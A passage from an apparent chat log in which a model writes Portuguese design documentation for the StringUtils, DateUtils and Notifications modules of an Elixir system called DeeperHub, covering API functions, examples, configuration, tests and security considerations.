*   **`DeeperHub.Shared.Utils.StringUtils` (Módulo Funcional):** Contém todas as funções de utilidade para strings.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/string_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Imutabilidade:** Todas as funções retornam novas strings, não modificando as originais.
*   **Tratamento de `nil`:** Funções devem lidar graciosamente com entradas `nil` (ex: retornando `nil`, string vazia, ou levantando `ArgumentError` conforme documentado).
*   **Unicode:** As funções devem ser seguras para uso com strings UTF-8.

## 🛠️ 4. Casos de Uso Principais

*   Converter chaves de API de `snake_case` (Elixir) para `camelCase` (JSON) e vice-versa.
*   Exibir uma prévia de um texto longo em uma UI, usando `truncate/3`.
*   Mostrar um ID de transação parcialmente mascarado em um extrato: `mask_id(\"txn_abcdef123456\", 4)`.
*   Gerar um ID de referência simples para um log: `generate_id(\"logref_\")`.

## 🌊 5. Fluxos Importantes

Não aplicável (módulo funcional).

## 📡 6. API (Funções Públicas do Módulo)

### 6.1. `DeeperHub.Shared.Utils.StringUtils.camel_to_snake(string :: String.t()) :: String.t()`

*   **Descrição:** Converte uma string em `camelCase` ou `PascalCase` para `snake_case`.
*   **Exemplo:** `camel_to_snake(\"UserProfile\")` -> `\"user_profile\"`

### 6.2. `DeeperHub.Shared.Utils.StringUtils.snake_to_camel(string :: String.t(), capitalize_first_letter :: boolean() \\\\ false) :: String.t()`

*   **Descrição:** Converte uma string em `snake_case` para `camelCase`. Se `capitalize_first_letter` for `true`, converte para `PascalCase`.
*   **Exemplo:** `snake_to_camel(\"user_profile_id\")` -> `\"userProfileId\"`, `snake_to_camel(\"user_profile\", true)` -> `\"UserProfile\"`

### 6.3. `DeeperHub.Shared.Utils.StringUtils.truncate(string :: String.t() | nil, max_length :: non_neg_integer(), suffix :: String.t() \\\\ \"...\") :: String.t() | nil`

*   **Descrição:** Trunca `string` para `max_length` se for maior, anexando `suffix`. Retorna `nil` se a entrada for `nil`.
*   **Exemplo:** `truncate(\"Texto muito longo\", 10)` -> `\"Texto m...\"`

### 6.4. `DeeperHub.Shared.Utils.StringUtils.mask_id(id_string :: String.t() | nil, visible_end_chars :: non_neg_integer(), mask_char :: String.t() \\\\ \"*\") :: String.t() | nil`

*   **Descrição:** Mascara o início de `id_string`, deixando `visible_end_chars` visíveis no final.
*   **Exemplo:** `mask_id(\"abcdef123456\", 4)` -> `\"********3456\"`

### 6.5. `DeeperHub.Shared.Utils.StringUtils.generate_id(prefix :: String.t() \\\\ \"\", length :: non_neg_integer() \\\\ 16) :: String.t()` (Nova Sugestão - para IDs não cripto)

*   **Descrição:** Gera uma string alfanumérica aleatória de `length` caracteres, prefixada por `prefix`. *Não usar para segredos ou tokens de segurança.*
*   **Exemplo:** `generate_id(\"ref_\", 8)` -> `\"ref_aB3x7pQk\"`

### 6.6. `DeeperHub.Shared.Utils.StringUtils.format_for_log(text :: String.t() | nil, max_length :: non_neg_integer() \\\\ 200) :: String.t() | nil`

*   **Descrição:** Trunca `text` para `max_length` (para logs) e substitui múltiplos espaços/novas linhas por um único espaço.
*   **Exemplo:** `format_for_log(\"Log \\n com \\t muitas \\s\\s linhas\", 50)` -> `\"Log com muitas linhas\"`

### 6.7. `DeeperHub.Shared.Utils.StringUtils.slugify(string :: String.t(), separator :: String.t() \\\\ \"-\") :: String.t()` (Nova Sugestão)

*   **Descrição:** Converte uma string em um \"slug\" amigável para URL (minúsculas, remove acentos, substitui espaços e caracteres especiais por `separator`).
*   **Exemplo:** `slugify(\"Título do Meu Post!\")` -> `\"titulo-do-meu-post\"`

### 6.8. `DeeperHub.Shared.Utils.StringUtils.humanize(string :: String.t()) :: String.t()` (Nova Sugestão)

*   **Descrição:** Converte uma string `snake_case` ou `camelCase` em uma frase legível por humanos (capitaliza a primeira letra, substitui `_` por espaço).
*   **Exemplo:** `humanize(\"user_profile_updated\")` -> `\"User profile updated\"`

## ⚙️ 7. Configuração

Este módulo geralmente não requer configurações externas, mas alguns padrões poderiam ser configuráveis se necessário:
*   Default `max_length` ou `suffix` para `truncate/3`.
*   Default `mask_char` para `mask_id/3`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   Nenhuma.

### 8.2. Bibliotecas Externas

*   Pode usar `Slugify` se a função `slugify/2` for complexa.
*   Pode usar `Unaccent` para remoção de acentos.
*   Geralmente, usa apenas funções do módulo `String` e `:binary` do Elixir/Erlang.

## 🤝 9. Como Usar / Integração

Simplesmente chame as funções do módulo onde a manipulação de string for necessária.
```elixir
alias DeeperHub.Shared.Utils.StringUtils

short_desc = StringUtils.truncate(long_description, 150)
api_key_masked = StringUtils.mask_id(api_key, 6)
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários para cada função com uma variedade de entradas, incluindo strings vazias, `nil`, strings com caracteres Unicode, e casos de borda para `truncate` e `mask_id`.
*   Localização: `test/deeper_hub/shared/utils/string_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Não aplicável para um módulo de utilitários puros.

## ❌ 11. Tratamento de Erros

*   Funções devem ser claras sobre como lidam com `nil` ou entradas inválidas (retornar `nil`, string vazia, ou levantar `ArgumentError`). Isso deve ser documentado por função.
*   Para `truncate` e `mask_id`, se `max_length` ou `visible_end_chars` for maior que o comprimento da string, a string original deve ser retornada.

## 🛡️ 12. Considerações de Segurança

*   As funções de mascaramento (`mask_id`) são para exibição e não devem ser consideradas uma forma de criptografia ou hashing seguro.
*   A função `generate_id` não é para tokens de segurança; use `:crypto.strong_rand_bytes/1` e codificação (ou `SecurityUtils`) para isso.
*   A função `slugify` deve garantir que o resultado não contenha caracteres que possam ser problemáticos em URLs ou nomes de arquivo.

## 🧑‍💻 13. Contribuição

*   Adicione novas funções apenas se forem verdadeiramente genéricas e reutilizáveis.
*   Mantenha as funções focadas e com comportamento previsível.
*   Adicione testes para todas as novas funções e para casos de borda de funções existentes.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais funções de manipulação de string comuns (ex: `strip_tags` mais robusto, `word_wrap`).
*   [ ] Melhorar o suporte Unicode em todas as funções, especialmente `slugify` e `humanize`.
*   [ ] Considerar a performance para funções que podem ser chamadas em loops com strings grandes.

---

*Última atualização: 2025-05-12*

---

Este detalha o `StringUtils`. Podemos seguir com outro módulo `Utils` como `DateUtils` ou `MapUtils`, ou voltar para um módulo Core ou de Segurança?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ótimo! Vamos continuar com os utilitários e detalhar o `DeeperHub.Shared.Utils.DateUtils`. A manipulação de datas e horas é uma necessidade comum em muitas partes de um sistema.

---

# Módulo: `DeeperHub.Shared.Utils.DateUtils` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Shared.Utils.DateUtils`

O módulo `DeeperHub.Shared.Utils.DateUtils` fornece um conjunto de funções utilitárias para **manipulação, cálculo e formatação de datas e horas** no sistema DeeperHub. Ele visa simplificar operações comuns relacionadas ao tempo, como adicionar ou subtrair intervalos, calcular diferenças entre datas, formatar datas para exibição e verificar se uma data está dentro de um determinado período.

Este módulo utiliza as estruturas de data e hora nativas do Elixir (`Date`, `Time`, `NaiveDateTime`, `DateTime`) e bibliotecas de calendário para fornecer funcionalidades robustas e conscientes de fuso horário quando necessário. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Manipulação de Datas/Horas:**
    *   Adicionar ou subtrair unidades de tempo (segundos, minutos, horas, dias, semanas, meses, anos) a uma data/hora (`add/3`).
    *   Obter o início ou fim de um período (dia, semana, mês, ano) para uma data/hora específica.
*   **Cálculo de Diferenças:**
    *   Calcular a diferença entre duas datas/horas em uma unidade específica (`diff/3`).
*   **Formatação de Datas/Horas:**
    *   Formatar `DateTime`, `NaiveDateTime`, ou `Date` em strings legíveis usando formatos predefinidos (curto, médio, longo) ou customizados (`format_datetime/3`).
    *   Formatar durações (em segundos ou outra unidade) em strings amigáveis (ex: \"1h 10m\", \"2 dias e 3 horas\") (`format_duration/2`).
*   **Verificação de Intervalos:**
    *   Verificar se uma data/hora está entre duas outras datas/horas (`is_between/3`).
    *   Verificar se uma data/hora está no passado ou no futuro.
    *   Verificar se um período de tempo se sobrepõe a outro.
*   **Conversões e Utilitários de Fuso Horário (Timezone):**
    *   Converter `NaiveDateTime` para `DateTime` em um fuso horário específico (e vice-versa), se o sistema lidar com múltiplos fusos horários de forma explícita.
    *   Obter o fuso horário padrão da aplicação.
*   **Geração de Timestamps:**
    *   Fornecer funções convenientes para obter o timestamp atual em UTC ou em formatos específicos.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

*   **`DeeperHub.Shared.Utils.DateUtils` (Módulo Funcional):**
    *   Contém todas as funções de utilidade para datas e horas.
    *   Utiliza os módulos `Date`, `Time`, `NaiveDateTime`, `DateTime` do Elixir.
    *   Pode usar bibliotecas como `Calendar` ou `Timex` para funcionalidades mais avançadas de manipulação de calendário e fuso horário se as funções nativas não forem suficientes.

### 3.2. Estrutura de Diretórios

```
lib/deeper_hub/shared/utils/date_utils.ex
```

### 3.3. Decisões de Design Importantes

*   **Consistência com Tipos Nativos:** Priorizar o uso e retorno dos tipos de data/hora nativos do Elixir (`Date`, `NaiveDateTime`, `DateTime`).
*   **Consciência de Fuso Horário:** Para operações que envolvem `DateTime`, ser explícito sobre fusos horários. Armazenar datas/horas no banco de dados preferencialmente em UTC e converter para o fuso horário do usuário apenas para exibição.
*   **Clareza da API:** Nomes de funções e parâmetros devem ser intuitivos.
*   **Imutabilidade:** Funções que modificam datas (como `add/3`) devem retornar uma nova estrutura de data/hora, não modificar a original.

## 🛠️ 4. Casos de Uso Principais

*   **Calcular Data de Expiração de um Token:**
    *   `token_creation_time = DateTime.utc_now()`
    *   `expiry_time = DateUtils.add(token_creation_time, 7, :day)`
*   **Exibir Data de Criação de um Post de Forma Amigável:**
    *   `formatted_date = DateUtils.format_datetime(post.inserted_at, :medium, user_locale)`
*   **Verificar se um Evento Agendado Já Começou:**
    *   `now = DateTime.utc_now()`
    *   `has_started = DateTime.compare(now, event.start_time) != :lt` (ou usando `is_between/3` de forma mais abstrata).
*   **Calcular Há Quanto Tempo um Comentário foi Postado:**
    *   `time_ago_in_seconds = DateUtils.diff(comment.inserted_at, DateTime.utc_now(), :seconds)`
    *   `friendly_time_ago = DateUtils.format_duration(time_ago_in_seconds, :short)` (ex: \"5m atrás\", \"2h atrás\")

## 🌊 5. Fluxos Importantes

Não aplicável (módulo funcional).

## 📡 6. API (Funções Públicas do Módulo)

*(Baseado na documentação original e expandindo)*

### 6.1. `DeeperHub.Shared.Utils.DateUtils.add(datetime :: Date.t() | NaiveDateTime.t() | DateTime.t(), amount :: integer(), unit :: :second | :minute | :hour | :day | :week | :month | :year) :: Date.t() | NaiveDateTime.t() | DateTime.t()`

*   **Descrição:** Adiciona uma quantidade de `unit` a `datetime`. Retorna o mesmo tipo que foi passado.
*   **Exemplo:** `DateUtils.add(DateTime.utc_now(), -3, :month)` (subtrai 3 meses).

### 6.2. `DeeperHub.Shared.Utils.DateUtils.diff(start_datetime, end_datetime, unit :: :second | :minute | :hour | :day | :week | :month | :year) :: float() | integer()`

*   **Descrição:** Calcula a diferença entre `end_datetime` e `start_datetime` na `unit` especificada.
*   Pode retornar float para unidades como `:hour` ou `:day` se houver frações.
*   **Exemplo:** `DateUtils.diff(~N[2023-01-01 10:00:00], ~N[2023-01-01 11:30:00], :minute)` -> `90`.

### 6.3. `DeeperHub.Shared.Utils.DateUtils.format_datetime(datetime, format_type :: :short | :medium | :long | :full | String.t(), locale :: String.t() \\\\ \"en\") :: String.t()`

*   **Descrição:** Formata `datetime` para uma string. `locale` pode ser \"pt-BR\", \"en-US\", etc. Se `format_type` for uma string, ela é usada como um formato customizado (ex: `\"{YYYY}-{0M}-{0D} {h24}:{0m}:{0s}\"`).
*   **Exemplo:** `DateUtils.format_datetime(DateTime.utc_now(), :long, \"pt-BR\")`.

### 6.4. `DeeperHub.Shared.Utils.DateUtils.format_duration(duration_seconds :: non_neg_integer(), format_type :: :short | :medium | :long | :human) :: String.t()`

*   **Descrição:** Formata uma duração em segundos para uma string legível.
    *   `:short`: \"1d 2h 3m 4s\"
    *   `:medium`: \"1 day, 2 hours, 3 minutes, 4 seconds\"
    *   `:long`: Similar a medium, mas pode ser mais verboso.
    *   `:human`: \"há 5 minutos\", \"em 2 horas\" (requer um ponto de referência, ou assume \"atrás\").
*   **Exemplo:** `DateUtils.format_duration(90061, :medium)` -> `\"1 day, 1 hour, 1 minute, 1 second\"` (aproximado).

### 6.5. `DeeperHub.Shared.Utils.DateUtils.is_between?(datetime_to_check, start_datetime, end_datetime, inclusive_ends :: boolean() \\\\ true) :: boolean()`

*   **Descrição:** Verifica se `datetime_to_check` está entre `start_datetime` e `end_datetime`.
*   **`inclusive_ends`:** Se `true`, os limites são inclusivos (`<=`, `>=`). Se `false`, exclusivos (`<`, `>`).

### 6.6. `DeeperHub.Shared.Utils.DateUtils.start_of(datetime, unit :: :day | :week | :month | :year) :: Date.t() | NaiveDateTime.t() | DateTime.t()` (Nova Sugestão)

*   **Descrição:** Retorna o início da unidade de tempo para a data/hora fornecida.
*   **Exemplo:** `DateUtils.start_of(~N[2023-05-12 15:30:00], :month)` -> `~N[2023-05-01 00:00:00]`.

### 6.7. `DeeperHub.Shared.Utils.DateUtils.end_of(datetime, unit :: :day | :week | :month | :year) :: Date.t() | NaiveDateTime.t() | DateTime.t()` (Nova Sugestão)

*   **Descrição:** Retorna o fim (último microssegundo) da unidade de tempo para a data/hora fornecida.
*   **Exemplo:** `DateUtils.end_of(~N[2023-05-12 15:30:00], :day)` -> `~N[2023-05-12 23:59:59.999999]`.

### 6.8. `DeeperHub.Shared.Utils.DateUtils.to_iso8601(datetime :: DateTime.t()) :: String.t()` (Nova Sugestão)

*   **Descrição:** Formata um `DateTime` para o padrão ISO8601 (ex: `\"2023-05-12T10:30:00.123Z\"`).

### 6.9. `DeeperHub.Shared.Utils.DateUtils.from_iso8601(iso_string :: String.t()) :: {:ok, DateTime.t()} | {:error, term()}` (Nova Sugestão)

*   **Descrição:** Parseia uma string ISO8601 para um `DateTime`.

### 6.10. `DeeperHub.Shared.Utils.DateUtils.utc_now_trimmed_to_second() :: DateTime.t()` (Nova Sugestão)

*   **Descrição:** Retorna `DateTime.utc_now()` com os microssegundos zerados, útil para comparações ou armazenamento.

## ⚙️ 7. Configuração

Este módulo geralmente não tem configurações complexas, mas poderia obter do `Core.ConfigManager`:
*   `[:shared, :utils, :date, :default_locale_for_formatting]` (String): Locale padrão para `format_datetime/3`. (Padrão: `\"en\"`)
*   `[:shared, :utils, :date, :default_timezone]` (String): Fuso horário padrão da aplicação (ex: `\"Etc/UTC\"`, `\"America/Sao_Paulo\"`). (Padrão: `\"Etc/UTC\"`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager` (opcional, para configurações padrão).

### 8.2. Bibliotecas Externas

*   `Calendar` (do Elixir): Usado internamente por `Date`, `DateTime`, etc.
*   `Timex` (opcional): Uma biblioteca popular para manipulação de datas e horas mais avançada, se as funcionalidades nativas não forem suficientes. No entanto, para os utilitários listados, a biblioteca padrão Elixir já oferece bastante.

## 🤝 9. Como Usar / Integração

Simplesmente chame as funções do módulo onde a manipulação de data/hora for necessária.
```elixir
alias DeeperHub.Shared.Utils.DateUtils

def token_expired?(token_created_at, ttl_days) do
  expiry_date = DateUtils.add(token_created_at, ttl_days, :day)
  DateTime.compare(DateTime.utc_now(), expiry_date) == :gt
end

def display_event_duration(start_time, end_time) do
  duration_seconds = DateUtils.diff(start_time, end_time, :second)
  DateUtils.format_duration(duration_seconds, :medium)
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testes unitários para cada função com uma variedade de entradas, incluindo:
    *   Diferentes tipos de data/hora (`Date`, `NaiveDateTime`, `DateTime`).
    *   Casos de borda (ex: adicionar a um fim de mês, anos bissextos).
    *   Diferentes unidades e formatos.
    *   Valores `nil` ou inválidos (se a função os aceitar e tiver comportamento definido).
*   Localização: `test/deeper_hub/shared/utils/date_utils_test.exs`.

### 10.2. Métricas / 10.3. Logs / 10.4. Telemetria

Geralmente não aplicável para um módulo de utilitários puros, a menos que uma função específica seja identificada como crítica para performance e precise de instrumentação.

## ❌ 11. Tratamento de Erros

*   Funções devem levantar `ArgumentError` ou `FunctionClauseError` para tipos de entrada inválidos.
*   Funções de parsing (como `from_iso8601`) devem retornar `{:ok, value} | {:error, reason}`.
*   A documentação de cada função deve especificar seu comportamento de erro.

## 🛡️ 12. Considerações de Segurança

*   **Timezone:** A principal consideração é o manuseio correto de fusos horários. Confusões de fuso horário podem levar a bugs lógicos e, em alguns casos, a vulnerabilidades (ex: expiração incorreta de tokens ou sessões). Sempre que possível, trabalhe com `DateTime` em UTC internamente e converta para o fuso horário do usuário apenas na camada de apresentação.
*   **Entrada do Usuário:** Se datas/horas vierem de entrada do usuário, elas devem ser parseadas e validadas rigorosamente antes de serem usadas em cálculos.

## 🧑‍💻 13. Contribuição

*   Ao adicionar novas funções, garanta que elas lidem corretamente com os diferentes tipos de data/hora do Elixir e sejam conscientes de fusos horários se usarem `DateTime`.
*   Adicione testes unitários completos para todas as novas funcionalidades.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar mais funções de conveniência (ex: `is_weekend?`, `days_in_month`, `next_business_day`).
*   [ ] Melhorar a função `format_duration` para suportar internacionalização (ex: \"1 dia\" vs \"1 day\").
*   [ ] Considerar a integração com `Timex` para funcionalidades de calendário mais complexas se necessário (ex: feriados, recorrências complexas).
*   [ ] Funções para calcular \"tempo relativo\" (ex: \"há 5 minutos\", \"amanhã\", \"na próxima semana\") de forma mais robusta e internacionalizada.

---

*Última atualização: 2025-05-12*

---

Os utilitários de data são sempre úteis!

Próximo? `MapUtils` ou `ListUtils` para continuar nos utilitários, ou podemos voltar para um módulo Core mais complexo como `DeeperHub.Core.BackgroundTaskManager` (que já começamos) ou `DeeperHub.Notifications`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, já documentamos o `DeeperHub.Core.BackgroundTaskManager`.

Vamos então para outro módulo Core essencial: `DeeperHub.Notifications`. Este módulo é responsável por toda a comunicação proativa do sistema com os usuários.

---

# Módulo: `DeeperHub.Notifications` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Notifications`

O módulo `DeeperHub.Notifications` é o sistema centralizado para **gerenciar e entregar notificações** aos usuários do DeeperHub através de múltiplos canais. Ele permite que diferentes partes da aplicação enviem mensagens importantes, alertas, lembretes ou atualizações para os usuários de forma consistente e configurável.

As notificações podem ser enviadas por canais como email, SMS (opcional), notificações push para aplicativos móveis, e notificações in-app (dentro da própria interface web/mobile do DeeperHub). O sistema também gerencia as preferências de notificação dos usuários, permitindo que eles escolham quais tipos de notificações desejam receber e por quais canais. 😊

*(Nota: A documentação original tem `DeeperHub.Core.NotificationsFacade`, `DeeperHub.Notifications` (módulo principal), `Services.DefaultNotificationService`, `Channels`, `Cache`, `Templates`, `Workers`, etc. Esta documentação consolida a fachada em `DeeperHub.Notifications` e organiza os componentes internos.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Envio de Notificações Multicanal:**
    *   Enviar notificações através de canais configurados: Email, In-App, Push (e opcionalmente SMS, Slack, etc.).
    *   Abstrair a complexidade de cada canal de entrega.
*   **Gerenciamento de Conteúdo e Templates (`Templates.TemplateManager`):**
    *   Utilizar templates para formatar o conteúdo das notificações.
    *   Suporte à internacionalização (i18n) de templates (`Templates.I18n.Translator`).
*   **Gerenciamento de Preferências do Usuário (`Services.PreferencesService`):**
    *   Permitir que usuários configurem quais tipos de notificações desejam receber em cada canal.
    *   Respeitar as preferências do usuário ao decidir se e como enviar uma notificação.
*   **Agendamento de Notificações (`Core.Notifications.Scheduler`):**
    *   Permitir o agendamento de notificações para serem enviadas em um momento futuro.
*   **Rastreamento e Histórico de Notificações (`Services.HistoryService`):**
    *   Manter um histórico das notificações enviadas aos usuários.
    *   Rastrear o status de entrega (enviada, entregue, falha, lida - se possível).
    *   Permitir que usuários visualizem seu histórico de notificações.
*   **Notificações In-App (`Channels.InAppChannel`):**
    *   Armazenar e exibir notificações dentro da interface da aplicação.
    *   Gerenciar o status de \"lida/não lida\" para notificações in-app.
*   **Processamento Assíncrono (`Workers`):**
    *   Enviar notificações (especialmente email e push) de forma assíncrona para não bloquear o fluxo principal da aplicação.
*   **Observabilidade e Métricas (`Telemetry`, `Metrics.MetricsReporter`):**
    *   Registrar métricas sobre o volume de notificações enviadas, taxas de entrega, taxas de abertura (se rastreável), erros.
    *   Logar atividades importantes e falhas.
*   **Limpeza de Dados Antigos (`Workers.RetentionWorker`):**
    *   Remover registros de notificações antigas conforme políticas de retenção.
*   **Integração com Eventos do Sistema (`Integrations.EventIntegration`):**
    *   Escutar eventos do `Core.EventBus` (ex: `user.created`, `password.reset_requested`) para disparar notificações relevantes automaticamente.
    *   Publicar eventos sobre o ciclo de vida das notificações (ex: `notification.sent`, `notification.read`).
*   **Notificações de Segurança (`Services.SecurityNotificationService`, `TokenNotifications`):**
    *   Enviar notificações críticas relacionadas à segurança da conta do usuário.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Notifications` (Fachada Pública):**
    *   Ponto de entrada principal para enviar notificações e gerenciar preferências.
    *   Delega para `NotificationService` (ou `DefaultNotificationService`).
2.  **`DeeperHub.Notifications.Services.DefaultNotificationService` (GenServer ou Serviço Coordenador):**
    *   **Responsabilidade:** Orquestra o processo de envio de notificações.
    *   **Interações:**
        *   `PreferencesService`: Para verificar as preferências do usuário.
        *   `TemplateManager`: Para renderizar o conteúdo da notificação.
        *   `Channel Adapters/Handlers` (ex: `EmailChannel`, `PushChannel`, `InAppChannel`): Para despachar a notificação para o canal apropriado.
        *   `Core.BackgroundTaskManager`: Para enfileirar o envio de notificações assíncronas.
        *   `HistoryService`: Para registrar a notificação enviada.
        *   `Core.ConfigManager`: Para configurações do sistema de notificações.
3.  **`DeeperHub.Notifications.Services.PreferencesService`:**
    *   Gerencia as preferências de notificação dos usuários (CRUD e consulta).
    *   Utiliza `DeeperHub.Notifications.Cache.PreferencesCache`.
4.  **`DeeperHub.Notifications.Services.HistoryService`:**
    *   Gerencia o histórico de notificações (CRUD e consulta).
5.  **`DeeperHub.Notifications.Templates.TemplateManager`:**
    *   Responsável por carregar, renderizar e cachear templates de notificação.
    *   Usa `Templates.I18n.Translator` para internacionalização.
6.  **`DeeperHub.Notifications.Channels.<ChannelName>Channel` (Behaviours e Implementações):**
    *   Cada canal (Email, Push, InApp, SMS) tem seu próprio módulo que implementa um `NotificationChannelBehaviour`.
    *   Ex: `EmailChannel` usa `DeeperHub.Mailer` para enviar emails.
    *   Ex: `PushChannel` interage com serviços como FCM/APNS.
7.  **`DeeperHub.Core.Notifications.Scheduler` (GenServer):**
    *   Gerencia o agendamento e disparo de notificações futuras.
8.  **Workers (`EmailWorker`, `PushWorker`, `InAppWorker`, `RetentionWorker`, `MetricsWorker`):**
    *   Processam o envio real de notificações, coletam métricas, limpam dados antigos.
9.  **Schemas Ecto:**
    *   `DeeperHub.Notifications.Schema.Notification`: Entidade principal da notificação.
    *   `DeeperHub.Notifications.Schema.NotificationPreference`: Preferências do usuário.
    *   `DeeperHub.Notifications.Schema.ScheduledNotification`: Notificações agendadas.
    *   `DeeperHub.Notifications.Schema.NotificationDelivery`: (Opcional) Para rastrear o status de entrega por canal.
10. **Cache (`PreferencesCache`, `TemplateCache`):**
    *   Para otimizar o acesso a preferências e templates renderizados.
11. **Integrações (`AuditIntegration`, `EventIntegration`):**
    *   Para logar no sistema de auditoria e interagir com o EventBus.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/notifications/
├── notifications.ex                  # Fachada Pública
│
├── services/
│   ├── default_notification_service.ex
│   ├── preferences_service.ex
│   ├── history_service.ex
│   └── security_notification_service.ex # (Ou TokenNotifications.ex)
│
├── channels/
│   ├── notification_channel_behaviour.ex
│   ├── email_channel.ex
│   ├── in_app_channel.ex
│   └── push_channel.ex
│   #├── sms_channel.ex (Opcional)
│
├── templates/
│   ├── template_manager.ex
│   ├── i18n/
│   │   ├── translator.ex
│   │   └── pt_br.ex # Exemplo de arquivo de tradução
│   └── email/ # Subdiretório para templates de email
│       └── welcome_email.html.eex
│
├── schemas/                          # (Ou schema/ singular)
│   ├── notification.ex
│   ├── notification_preference.ex
│   ├── scheduled_notification.ex
│   └── notification_delivery.ex      # Opcional
│
├── workers/
│   ├── email_worker.ex
│   ├── push_worker.ex
│   ├── in_app_worker.ex
│   ├── retention_worker.ex
│   └── metrics_worker.ex             # Para coletar métricas periódicas do sistema de notificações
│
├── cache/
│   ├── preferences_cache.ex
│   └── template_cache.ex
│
├── integrations/
│   ├── audit_integration.ex
│   └── event_integration.ex
│
├── scheduler.ex                      # (Core.Notifications.Scheduler)
├── supervisor.ex                     # Supervisor principal do módulo Notifications
├── unified_supervisor.ex             # Supervisor que inicia o supervisor principal
└── telemetry.ex
```

### 3.3. Decisões de Design Importantes

*   **Desacoplamento de Canais:** A lógica de envio para cada canal é isolada em seu próprio módulo, facilitando a adição ou modificação de canais.
*   **Processamento Assíncrono:** O envio de notificações (especialmente email/push) é feito em background para não impactar a performance da requisição original.
*   **Preferências do Usuário em Primeiro Lugar:** O sistema deve sempre respeitar as preferências do usuário antes de enviar uma notificação.
*   **Templates e I18n:** Usar templates e internacionalização torna as notificações flexíveis e personalizáveis.
*   **Rastreabilidade:** Manter um histórico e status de entrega é importante para diagnóstico e para o usuário.

## 🛠️ 4. Casos de Uso Principais

*   **Novo Usuário se Registra:**
    *   `DeeperHub.Accounts` publica evento `user.created`.
    *   `Notifications.Integrations.EventIntegration` (ou um listener específico) recebe o evento.
    *   Chama `Notifications.send_notification(user_id, :welcome_email, %{name: user.name}, opts)` (o tipo `:welcome_email` define o template e canais padrão).
    *   `DefaultNotificationService` verifica preferências, renderiza o template e enfileira a tarefa de envio para `EmailWorker`.
*   **Alerta de Segurança: Login de Novo Dispositivo:**
    *   `DeeperHub.Security` detecta o novo dispositivo.
    *   Chama `Notifications.Services.SecurityNotificationService.notify_new_device(user_id, device_info, opts)`.
    *   Esta função pode ter canais prioritários (ex: email e push) e um template específico.
*   **Lembrete de Tarefa Agendada:**
    *   Uma tarefa foi agendada para notificar o usuário.
    *   `Core.Notifications.Scheduler` dispara a notificação no momento correto.
    *   Chama `Notifications.send_notification(...)`.
*   **Usuário Atualiza Preferências de Notificação:**
    *   Usuário desmarca notificações por email para \"novidades\".
    *   UI chama `Notifications.update_notification_preferences(user_id, new_preferences)`.
    *   `PreferencesService` atualiza e invalida o cache.

## 🌊 5. Fluxos Importantes

### Fluxo de Envio de Notificação (Exemplo: Email)

1.  **Chamador (ex: `AccountsService`):** Chama `DeeperHub.Notifications.send_notification(user_id, :user_registered, %{user_name: \"John\"}, opts)`.
2.  **`Notifications` (Fachada):** Delega para `DefaultNotificationService`.
3.  **`DefaultNotificationService`:**
    *   Chama `PreferencesService.get_user_preferences(user_id)` para ver se o usuário quer receber notificações do tipo `:user_registered` e por quais canais.
    *   Se o canal email estiver habilitado para este tipo:
        *   Chama `TemplateManager.render_email_template(\"user_registered_email\", locale, %{user_name: \"John\", ...})` para obter o assunto e corpo do email.
        *   Chama `TemplateManager.get_email_subject(\"user_registered_email\", locale)`.
        *   Cria uma struct `Notification` com os detalhes.
        *   Persiste a `Notification` via `HistoryService` (ou diretamente via Repo).
        *   Enfileira uma tarefa para `DeeperHub.Notifications.Workers.EmailWorker` via `Core.BackgroundTaskManager` passando o `notification_id` ou todos os dados do email.
4.  **`EmailWorker` (Background Task):**
    *   Recebe a tarefa.
    *   Busca os detalhes da notificação (se apenas o ID foi passado).
    *   Chama `DeeperHub.Mailer.send_email(%{to: user.email, subject: ..., body: ...})`.
    *   Atualiza o status da `Notification` (e/ou `NotificationDelivery`) para `:sent` ou `:failed` via `HistoryService`.
    *   Publica evento `notification.sent` ou `notification.failed` via `Core.EventBus`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Notifications`)

*(Muitas já foram vistas na documentação original de `NotificationsFacade` e `Core.NotificationsFacade`. Consolidando e refinando.)*

### 6.1. `DeeperHub.Notifications.send_notification(user_id :: String.t(), notification_type :: atom(), content_data :: map(), opts :: keyword()) :: {:ok, Notification.t() | list(Notification.t())} | {:error, term()}`

*   **Descrição:** Envia uma notificação para um usuário. O `notification_type` é usado para buscar o template, determinar os canais padrão e respeitar as preferências do usuário.
*   **`content_data`:** Mapa com variáveis para o template.
*   **`opts`:**
    *   `:channels` (list(atom)): Força o envio por canais específicos, ignorando algumas preferências (usar com cautela). Ex: `[:email, :in_app]`.
    *   `:priority` (atom): `:low`, `:normal`, `:high`.
    *   `:metadata` (map): Metadados adicionais.
*   **Retorno:** Pode retornar a `Notification` criada ou uma lista se for para múltiplos canais/entregas.

### 6.2. `DeeperHub.Notifications.send_bulk_notification(user_ids :: list(String.t()), notification_type :: atom(), content_data :: map(), opts :: keyword()) :: {:ok, BulkNotificationJob.t()} | {:error, term()}`

*   **Descrição:** Envia a mesma notificação para múltiplos usuários. Geralmente enfileira um job de background.
*   **`BulkNotificationJob.t()`:** Uma struct com informações sobre o job em lote.

